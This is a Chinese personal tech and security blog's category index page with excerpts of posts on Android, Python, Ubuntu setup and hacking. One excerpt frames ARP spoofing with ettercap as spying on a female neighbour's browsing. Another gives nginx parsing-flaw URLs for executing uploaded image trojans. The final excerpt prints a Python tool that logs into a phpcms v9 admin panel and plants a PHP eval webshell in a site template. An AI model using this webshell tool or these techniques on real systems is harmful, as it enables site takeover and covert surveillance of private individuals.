<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>原创作品 | Return&#39;s Blog </title>
  <meta name="author" content="Return">
  
  <meta name="description" content="专注于互联网开发技术，注重网络安全技术，注重网络攻防技术，注重渗透测试技术，backtrack5渗透测试平台研究，软件开发，网页设计，网页制作，网站建设">
  
  
  
  <meta property="og:site_name" content="Return&#39;s Blog "/>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta property="og:image" content="undefined"/>
  
   <link rel="apple-touch-icon" href="/icon.png" />
   <link rel="shortcut icon" href="/favicon.png" >
   <link rel="alternate" href="http://www.creturn.com/atom.xml" title="Return&#39;s Blog " type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
</head>


<body>
  <div id="content" class="inner">
    <aside id="sidebar" class="alignleft">
      <div class="navigationBar">
        <a href="/">Return&#39;s Blog </a>
      </div>
    	
  <nav class="widget" id="menu">
	<ul>
    
      <li class="cell"><a class="next" href="/">Home</a><li>
    
      <li class="cell"><a class="next" href="/archives/">Archives</a><li>
    
      <li class="cell"><a class="next" href="/about/">About</a><li>
    
    </ul>
</nav>

  
<div class="widget tag">
  <h3 class="title">分类</h3>
  <ul class="entry">
  
    <li><a href="/categories/原创作品/">原创作品</a><small>30</small></li>
  
    <li><a href="/categories/原创作品/技术文章/">技术文章</a><small>23</small></li>
  
    <li><a href="/categories/技术文章/">技术文章</a><small>7</small></li>
  
    <li><a href="/categories/原创作品/技术文章/最新漏洞/">最新漏洞</a><small>3</small></li>
  
    <li><a href="/categories/技术文章/最新漏洞/">最新漏洞</a><small>2</small></li>
  
    <li><a href="/categories/最新漏洞/">最新漏洞</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tagcloud">
  <h3 class="title">标签云</h3>
  <div class="entry">
    <a href="/tags/Android/" style="font-size: 10.00px;">Android</a><a href="/tags/Backtrack5/" style="font-size: 10.00px;">Backtrack5</a><a href="/tags/Metasploit/" style="font-size: 10.00px;">Metasploit</a><a href="/tags/Mysql/" style="font-size: 10.00px;">Mysql</a><a href="/tags/Nginx解析漏洞/" style="font-size: 10.00px;">Nginx解析漏洞</a><a href="/tags/Return/" style="font-size: 10.00px;">Return</a><a href="/tags/ThinkPHP远程/" style="font-size: 10.00px;">ThinkPHP远程</a><a href="/tags/alfred/" style="font-size: 10.00px;">alfred</a><a href="/tags/android/" style="font-size: 13.33px;">android</a><a href="/tags/apache/" style="font-size: 10.00px;">apache</a><a href="/tags/armitage/" style="font-size: 10.00px;">armitage</a><a href="/tags/arp欺骗/" style="font-size: 10.00px;">arp欺骗</a><a href="/tags/cain/" style="font-size: 10.00px;">cain</a><a href="/tags/dedecms漏洞/" style="font-size: 10.00px;">dedecms漏洞</a><a href="/tags/easyui/" style="font-size: 10.00px;">easyui</a><a href="/tags/eclipse/" style="font-size: 10.00px;">eclipse</a><a href="/tags/java/" style="font-size: 10.00px;">java</a><a href="/tags/linux arp欺骗/" style="font-size: 10.00px;">linux arp欺骗</a><a href="/tags/os x/" style="font-size: 10.00px;">os x</a><a href="/tags/php/" style="font-size: 13.33px;">php</a><a href="/tags/phpcmsv9漏洞/" style="font-size: 16.67px;">phpcmsv9漏洞</a><a href="/tags/phpcsm2008漏洞/" style="font-size: 10.00px;">phpcsm2008漏洞</a><a href="/tags/python/" style="font-size: 13.33px;">python</a><a href="/tags/thinkPHP漏洞/" style="font-size: 10.00px;">thinkPHP漏洞</a><a href="/tags/ubuntu/" style="font-size: 10.00px;">ubuntu</a><a href="/tags/web wifi认证/" style="font-size: 10.00px;">web wifi认证</a><a href="/tags/webshell/" style="font-size: 20.00px;">webshell</a><a href="/tags/window密码/" style="font-size: 10.00px;">window密码</a><a href="/tags/wordpress漏洞/" style="font-size: 13.33px;">wordpress漏洞</a><a href="/tags/workflow/" style="font-size: 10.00px;">workflow</a><a href="/tags/xUtils/" style="font-size: 10.00px;">xUtils</a><a href="/tags/互联网技术/" style="font-size: 10.00px;">互联网技术</a><a href="/tags/任意密码登录/" style="font-size: 10.00px;">任意密码登录</a><a href="/tags/任意读取文件漏洞/" style="font-size: 10.00px;">任意读取文件漏洞</a><a href="/tags/入侵/" style="font-size: 10.00px;">入侵</a><a href="/tags/后门/" style="font-size: 20.00px;">后门</a><a href="/tags/嗅探/" style="font-size: 10.00px;">嗅探</a><a href="/tags/图马/" style="font-size: 10.00px;">图马</a><a href="/tags/打飞机/" style="font-size: 10.00px;">打飞机</a><a href="/tags/注入漏洞/" style="font-size: 10.00px;">注入漏洞</a>
  </div>
</div>


    	<footer id="footer" class="inner"><div class="copyright">
  
  &copy; 2014 Return
  
</div>


<div style="position:relative; bottom: 23px">
  <script src="http://s95.cnzz.com/stat.php?id=4287542&web_id=4287542&show=pic1" language="JavaScript">
  </script>
</div>


</footer>
    </aside>
    
    
    <div id="hidden-navigationBar" class="navigationBar">
      <a href="/">Return&#39;s Blog </a>
    </div>
    <div id="main-col" class="alignright">
    <div id="wrapper">
      
<h2 class="archive-title category">原创作品</h2>


  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2013-11-06-radiowar-之osmocombb-sms-sniffer.html">Radiowar 之OsmocomBB SMS Sniffer</a></h1>
  

      <time datetime="2013-11-06T12:34:49.000Z"><a href="/html/2013-11-06-radiowar-之osmocombb-sms-sniffer.html">11月 6 2013</a></time>
      
  </header>
    <div class="entry">
      
        <p>好久没写东西了，前几天看到Radiowar这个词的时候感觉有点意思，</p>
<p>可能是因为之前写过War Driving 的文章对War很敏感吧.</p>
<p>Radiowar指的是无线安全攻击，不过很多人听到无线攻击就和无线网络破解划等号了。</p>
<p>其实Radiowar 包含所有无线电子设备如：2.4GHz网络、RFID、NFC等等.</p>
<p>很多人现在都在玩Proxmark3 奈何成本过大，做个试验最少也得千把来块，自己对这个也仅仅是感兴趣，</p>
<p>所以就从一些简单且Cheap的设备玩起，刚好最近看到有几个人发了GSM网络嗅探的文章，</p>
<p>自己就弄些设备来玩，成本较低，一套设备下来100左右。</p>
<p>设备清单：</p>
<ol>
<li>摩托罗拉 C118 (25块)</li>
<li>FT232RL USB TO TTL (30元)</li>
<li>摩托罗拉 Motorola C118专用数据连接线 (10块)</li>
<li>MiniUSB 链接线(10元，这个大家手里应该都有)</li>
</ol>
<p>如下图：</p>
<p><a href="http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-7.png" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-7.png" alt="QQ20131106-7"></a>

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2013-11-06-radiowar-之osmocombb-sms-sniffer.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2013-08-13-android版微信打飞机无敌补丁分析及其制作方法.html">android版微信打飞机无敌补丁分析及其制作方法</a></h1>
  

      <time datetime="2013-08-13T07:05:43.000Z"><a href="/html/2013-08-13-android版微信打飞机无敌补丁分析及其制作方法.html">8月 13 2013</a></time>
      
  </header>
    <div class="entry">
      
        <p>最近微信5.0版本发布后增加了游戏中心，并且自带一款打飞机游戏,ios版本刚发布1天就被crack掉,并且除了一个无敌补丁，奈何手里没ios设备也没法测试.自己玩了下，感觉游戏真没多少技术含量，不过微信的优势很明显，集成了好友数据,所以结果就是最近天天听到那些家伙喊着”打飞机” ~。~</p>
<p>不过对于游戏一点都不感冒的我看到好友那么高的分数再对比下自己，额真有点那个啥。所以对于技术控来说去拼命玩那个玩意就有点浪费生命了，所以本着hack for fun 的思想就试试看看能crack掉不.</p>
<p>首先分析下游戏</p>
<p>游戏对象：</p>
<p>飞机，子弹，炸弹，敌机
实现方法就有多种成为无敌的方法:</p>
<p>1.让飞机无敌，也就是不死</p>
<p>2.让子弹威力变大，并且不消失,这样一个子弹就可以打多个敌机</p>
<p>3.给自己添加”大量”炸弹,这样也就无敌了</p>
<p>4.让敌机碰到自己无效,这样就相当于隐形模式了,同样无敌了</p>
<p>5.给自己多加几条名，这样既可以达到无敌的方式又可以死掉（方便提交分数）不然死都死不掉。</p>

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2013-08-13-android版微信打飞机无敌补丁分析及其制作方法.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2013-07-25-android最近问题总结.html">android最近问题总结 </a></h1>
  

      <time datetime="2013-07-25T06:27:53.000Z"><a href="/html/2013-07-25-android最近问题总结.html">7月 25 2013</a></time>
      
  </header>
    <div class="entry">
      
        <p>1. 主线线程中更新UI
由于android的限制，不允许在主线程中对UI进行修改操作，必须要再新线程中。其实这点和lpython 的pyGtk很相似，估计都同为linux的产物。
自己更新UI的方式：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="code"><pre><span class="comment">//先声明一个Handler，用来接收消息</span>
<span class="keyword">private</span> Handler messageHandler;
<span class="comment">//消息标识</span>
<span class="keyword">private</span> finalist UPDATE_UI = <span class="number">1</span>;

messageHandler = <span class="keyword">new</span> Handler() {
<span class="annotation">@Override</span>
<span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span>(Message msg) {
    <span class="keyword">if</span> (msg.what == UPDATE_UI) {
        updateUI(); <span class="comment">//更新UI的方法</span>
    }
}
</pre></td></tr></table></figure>


      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2013-07-25-android最近问题总结.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2013-07-06-alfred2-的workflow-开发实例-百度贴吧插件.html">Alfred2 的workflow 开发实例-百度贴吧插件</a></h1>
  

      <time datetime="2013-07-06T07:22:05.000Z"><a href="/html/2013-07-06-alfred2-的workflow-开发实例-百度贴吧插件.html">7月 6 2013</a></time>
      
  </header>
    <div class="entry">
      
        <p>貌似有点懒，今年第二篇…</p>
<p>Alfred2 os x 上的一个比较好的插件好的插件，对于命令控来说绝对是福音。</p>
<p>官网地址：<a href="http://www.alfredapp.com" target="_blank">http://www.alfredapp.com</a></p>
<p>它的插件机制加上新版本的workflow支持fallback后似的他的更受欢迎。</p>
<p>先上一张今天要介绍的插件，贴吧的workflow。自己平时比较喜欢在贴吧里面看小说。</p>
<p>之前找了一个贴吧的插件，不过用起来发现作者采用了缓存机制，其实加入缓存机制其实还是</p>
<p>比较好的，不过缓存了一天多都没变化这个就有问题了。本来想直接修改原来的插件去掉缓存机制或者</p>
<p>把缓存时间修改短点也行，但是发现是python运行编译的文件，去作者github上的看看能找到源码不结果</p>
<p>令人很失望，一个这么简单的东西放了那么一大堆不知道都起什么作用的包，还不开放源码，还敢用吗？</p>

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2013-07-06-alfred2-的workflow-开发实例-百度贴吧插件.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2013-03-12-python拼接图片.html">Python拼接图片</a></h1>
  

      <time datetime="2013-03-12T05:42:13.000Z"><a href="/html/2013-03-12-python拼接图片.html">3月 12 2013</a></time>
      
  </header>
    <div class="entry">
      
        <p>貌似这是13年第一次写文章了。好吧，去年主要写一些安全方面的文章，今年就把技术文章也加进来，已做笔记（其实天天用evenote）。</p>
<p>人常说，不偷懒的程序员不是好程序员。今天有个任务比较麻烦，当然这个还不是我自己的任务。其实是美工的，不过一个团队，能帮</p>
<p>点尽量帮点忙。神马任务呢？就是游戏的图场景已经被地图编辑器分割成300×300像素的小图。然后部门经理要美工吧图都拼成大图以便</p>
<p>修改方便…100多场景，每个场景里面至少150张小图，任你美工技术多牛叉，我想没一个星期是弄不来的。</p>
<p>So 就帮妹子一把~。~</p>

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2013-03-12-python拼接图片.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-12-20-户外黑阔之war-driving-应用原理分析及其工具使用.html">户外黑阔之War Driving 应用原理分析及其工具使用</a></h1>
  

      <time datetime="2012-12-20T05:34:34.000Z"><a href="/html/2012-12-20-户外黑阔之war-driving-应用原理分析及其工具使用.html">12月 20 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>很久没写东西了，最近太忙了～～～</p>
<p>今天给介绍一个新名词 “War Driving” ，看过幽灵的朋友们有没有留意到最后抓捕大哥组织里面那群人时候他们开着货车移动式攻击有没有印象？如果不感兴趣，那么下面的文章可以不用看了。感兴趣的继续～～</p>
<p>War Driving：是驾驶攻击也称为接入点映射，这是一种在驾车围绕企业或住所邻里时扫描无线网络名称的活动。</p>
<p>要想进行驾驶攻击你就要具备一辆车、一台电脑（膝上型电脑）、一个工作在混杂模式下的无线以太网网卡，还有一个装在车顶部或车内的天线。</p>
<p>因为一个无线局域网可能仅局限于一栋办公楼的范围内，外部使用者就有可能会入侵网络，获得免费的企业内部网络连接，还可能获得公司的一些记录</p>
<p>和其他一些资源。 用全方位天线和全球定位系统（GPS），驾驶攻击者就能够系统地将802.11b/g/n无线接入点映射地址映射。</p>
<p>好吧，上面的废话都是来自读娘。驾乘式攻击，其实在现实当中用来收集信息才是比较使用的。那么收集到的信息有哪些？</p>

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-12-20-户外黑阔之war-driving-应用原理分析及其工具使用.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-11-25-利用gpu运算工具hashcat爆破window密码.html">利用GPU运算工具hashcat爆破window密码</a></h1>
  

      <time datetime="2012-11-25T04:55:47.000Z"><a href="/html/2012-11-25-利用gpu运算工具hashcat爆破window密码.html">11月 25 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>今天介绍一款利用显卡超强运算能力进行爆破密码的工具hashcat，用它来进行爆破window密码</p>
<p>当然他支持的不仅仅是window SAM密码的爆破。</p>
<p>我本机环境和显卡信息如图：</p>
<p><a href="http://asset.creturn.com/asset/uploads/2013/11/224255j1foiui0lrc10rsh.png" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2013/11/224255j1foiui0lrc10rsh.png" alt="224255j1foiui0lrc10rsh"></a></p>

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-11-25-利用gpu运算工具hashcat爆破window密码.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-11-11-pythonpygtkapi写的一个简单的词典.html">python+pygtk+api写的一个简单的词典</a></h1>
  

      <time datetime="2012-11-11T05:14:54.000Z"><a href="/html/2012-11-11-pythonpygtkapi写的一个简单的词典.html">11月 11 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>最见看看gtk的资料顺便练练手，就顺手写个词典玩玩，十来分钟的事情～～</p>
<p>python越用越觉得顺手，简洁。不到50行代码就完成了，代码没有精简，要不然更短小～</p>
<p>查询是调用爱词霸的接口：<a href="http://dict-co.iciba.com/api/dictionary.php?w=" target="_blank">http://dict-co.iciba.com/api/dictionary.php?w=</a> 接口地址后面跟</p>
<p>查询的词汇</p>
<p>返回的是xml数值。里面附带所有信息，包括发音 的声音文件地址，如果想带发音的功能</p>
<p>可以直接使用它的文件，返回数值接口信息截图：</p>
<p><a href="http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-1.png" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-1.png" alt="QQ20131106-1"></a></p>

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-11-11-pythonpygtkapi写的一个简单的词典.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-10-27-arp欺骗攻击的另类应用之屌丝泡妞记.html">Arp欺骗攻击的另类应用之屌丝泡妞记</a></h1>
  

      <time datetime="2012-10-26T16:05:23.000Z"><a href="/html/2012-10-27-arp欺骗攻击的另类应用之屌丝泡妞记.html">10月 27 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>EveryNote 真是个好动西，跨平台的笔记本。好到，平时记录一些自己的东西，都懒得在写博客了。呵呵，很久都</p>
<p>没有写文章了。最近一切烦心事一大堆，就弄个好玩的东西来玩玩。Arp欺骗的另类应用，为啥说是arp欺骗的另类</p>
<p>应用呢？假设合租屋里隔壁有个漂亮MM，想知道他平时都上网干些什么，喜欢什么，怎么弄到她的联系方式？</p>
<p>嘿嘿，接着往下看看。</p>
<p>arp欺骗，我想大家都应该知道怎么回事了。不知道的去问度娘。。。</p>
<p>就不废话了，还是直接上图上教程比较实在。环境，ubuntu 12.10 当然你也可以是ubuntu的其他版本。或者其他linux</p>
<p>系统。环境如图：</p>
<p><a href="http://asset.creturn.com/asset/uploads/2012/10/001.png" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2012/10/001.png" alt="" title="001"></a></p>
<p>Arp欺骗工具我们就用ettercap吧，经典工具我就不多说了。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>sudo apt<span class="attribute">-get</span> install  ettercap<span class="attribute">-text</span><span class="attribute">-only</span>  <span class="comment">//安装纯字符界面的ettercap</span>
</pre></td></tr></table></figure>


      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-10-27-arp欺骗攻击的另类应用之屌丝泡妞记.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-08-29-nginx解析漏洞原理及其利用方法.html">Nginx解析漏洞原理及其利用方法</a></h1>
  

      <time datetime="2012-08-28T19:08:09.000Z"><a href="/html/2012-08-29-nginx解析漏洞原理及其利用方法.html">8月 29 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>Nginx解析漏洞已经是比较老的漏洞了，但是互联网上还有不少使用存在解析漏洞的nginx版本。</p>
<p>很久没写文章了，睡觉去去法客转了圈看到一片nginx漏洞的渗透文章，才发现自己似乎也没写过。</p>
<p>nginx解析漏洞是由于nginx部分版本程序本身的漏洞导致解析非可以执行脚本程序如PHP.</p>
<p>如下面两个假设在存在漏洞的站点上有一张图片url地址为：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>www<span class="preprocessor">.creturn</span><span class="preprocessor">.com</span>/logo<span class="preprocessor">.jpg</span>   //假设存在这个图片
</pre></td></tr></table></figure>

<p>而当我们正常访问，nginx会把这个当作非脚本语言直接读取传送会客户端（也就是浏览器），但是</p>
<p>存在解析漏洞的nginx会把如下连接解析并且执行~：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre>1
2
</pre></td><td class="code"><pre>www<span class="preprocessor">.creturn</span><span class="preprocessor">.com</span>/logo<span class="preprocessor">.jpg</span>/a<span class="preprocessor">.php</span>  （老的解析方式）这样写的话nginx会把logo<span class="preprocessor">.jpg</span>当作脚本解析执行后再输出
www<span class="preprocessor">.creturn</span><span class="preprocessor">.com</span>/logo<span class="preprocessor">.jpg</span>%<span class="number">00.</span>php //这个是<span class="number">7</span>月中旬爆出的解析漏洞
</pre></td></tr></table></figure>

<p>这样的解析漏洞有什么危害？其实很多站的安全或者程序样做的比较严谨的话，就没办法直接拿下，但是很多社交类</p>
<p>或者交互类的站点上往往允许用户上传图片，如社交网站一般都会允许上传头像~这样如果有心人传送一个图马上去就可以直接解析了。</p>

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-08-29-nginx解析漏洞原理及其利用方法.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-08-15-ubuntu下eclipseerlangmongodb开发环境搭建.html">ubuntu下eclipse+erlang+mongodb开发环境搭建</a></h1>
  

      <time datetime="2012-08-15T15:56:28.000Z"><a href="/html/2012-08-15-ubuntu下eclipseerlangmongodb开发环境搭建.html">8月 15 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>最近公司webGame项目中用到了Erlang+MongoDB，没办法项目需要那就学呗。</p>
<p>学这个东西最起码得有环境吧，今天搭建开发环境就顺便记录一下，依然在ubuntu下进行开发。</p>
<p>顺便说下，如果做开发，最好选择linux，因为很多环境在linux下搭建很方便。win下一般也会</p>
<p>有相应的发法搭建，但是经常会遇到一些莫名其妙的问题。因此建议做开发的同学还是Linux下吧。</p>
<p>好了不废话了，继续我们的环境搭建（Ubuntu下进行）：</p>
<p>Mongodb 安装</p>
<p>打开命令输入如下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre><span class="built_in">sudo</span> apt-get install mongodb
</pre></td></tr></table></figure>

<p>
      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-08-15-ubuntu下eclipseerlangmongodb开发环境搭建.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-08-13-ubuntu下都php开发环境架设.html">Ubuntu下的PHP开发环境架设</a></h1>
  

      <time datetime="2012-08-13T14:56:07.000Z"><a href="/html/2012-08-13-ubuntu下都php开发环境架设.html">8月 13 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>今天重新装了ubuntu那么就吧过程记录下。</p>
<p>打开终端，也就是命令提示符。</p>
<p>我们先来最小化组建安装，按照自己的需求一步一步装其他扩展。命令提示符输入如下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>sudo apt<span class="attribute">-get</span> install apache2 php5<span class="attribute">-mysql</span> libapache2<span class="attribute">-mod</span><span class="attribute">-php5</span> mysql<span class="attribute">-server</span>
</pre></td></tr></table></figure>

<p>上面的命令是最小化组建安装amp也就是apache2 ,php5 和 mysql 在加上一个php的mysql扩展</p>
<p><a href="http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-002350的屏幕截图.png" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-002350的屏幕截图.png" alt="" title="2012-08-14 00:23:50的屏幕截图"></a>

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-08-13-ubuntu下都php开发环境架设.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-08-08-python版-phpcmsv9自动写shell工具.html">Python版 phpcmsV9自动写shell工具</a></h1>
  

      <time datetime="2012-08-07T17:21:18.000Z"><a href="/html/2012-08-08-python版-phpcmsv9自动写shell工具.html">8月 8 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>最近一直在学习python相关内容就顺手写个工具以作练习，上代码：</p>
<blockquote>
<p>注意：本程序具有攻击性，请勿用作非法用途，否则于本作者无关！</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
</pre></td><td class="code"><pre>#coding: GBK
'''
Created on 2012-8-2

@author: Return
'''
import cookielib
import urllib2,urllib
import re
import sys
import os
import socket
class getShell:

    rhost = ''                                  #远程目标主机
    cookieSavePath  = 'tmp/cookie/cookie.dat'   #cookie 保存位置
    codeSavePath    = 'tmp/code/code.png'       #code    保存位置
    phpShell        = '&lt;?php $shell = &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;; file_put_contents(&quot;caches/cmd.php&quot;,$shell); ?&gt;' #一句话
    header          = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 QIHU 360EE'}
    tmpPath         = ''    #临时地址存贮变量
    dataBaseInfo    = {}    #数据库信息
    postData        = {}    #post数据
    url             = ''    #远程url地址
    username        = ''    #用户名
    password        = ''    #用户密码
    vfCode          = ''    #验证码
    pc_hash         = ''    #phpcmsV9校验值
    result          = ''    #临时变量
    #==============================================================
    # __init__    初始化函数
    #==============================================================
    def __init__(self):
        self.cookie = cookielib.LWPCookieJar()
        urllib2.install_opener(urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookie)))
    #==============================================================
    # login    登录
    #==============================================================
    def login(self):
        self.getVerifyCode()    #先获取验证码
        self.tmpPath  = '/index.php?m=admin&amp;c=index&amp;a=login&amp;dosubmit=1'
        self.postData = {
             'username':self.username,
             'password':self.password,
             'code':self.vfCode,
             'dosubmit':''
            }
        self.url = 'http://'+self.rhost+self.tmpPath
        self.result = self.urlPostData()

        if len(re.findall(&quot;登录成功&quot;,self.result)):
            self.pc_hash = re.search(&quot;(?&lt;=pc_hash=)(.+?)(?=')&quot;,self.result).group()
            print '登录成功'
            self.wirteShell() # 登陆成功后写入shell
        else:
            print '登录失败'
            print re.search('(330px&quot;&gt;)((.|n)*?)(?=&lt;/div&gt;)',self.result).group(2)
            self.login()
    def wirteShell(self):
        print '写入Shell...'
        tmpPath = '/index.php?m=template&amp;c=file&amp;a=edit_file&amp;style=default&amp;dir=search&amp;file=footer.html&amp;pc_hash='
        self.url = 'http://'+self.rhost+tmpPath+self.pc_hash   #v9中必须加上校验码，否则不能通过
        self.result = self.urlPostData()
        if len(re.findall('点击插入',self.result)):
            templateTmp = re.search(&quot;(&lt;te.*?&gt;)((.|n)*?)(&lt;.*?&gt;)&quot;,self.result).group(2)
            #提交写shell模版
            self.postData = {
                    'code':self.phpShell,
                    'dosubmit':'提交',
                    'pc_hash':self.pc_hash
                }
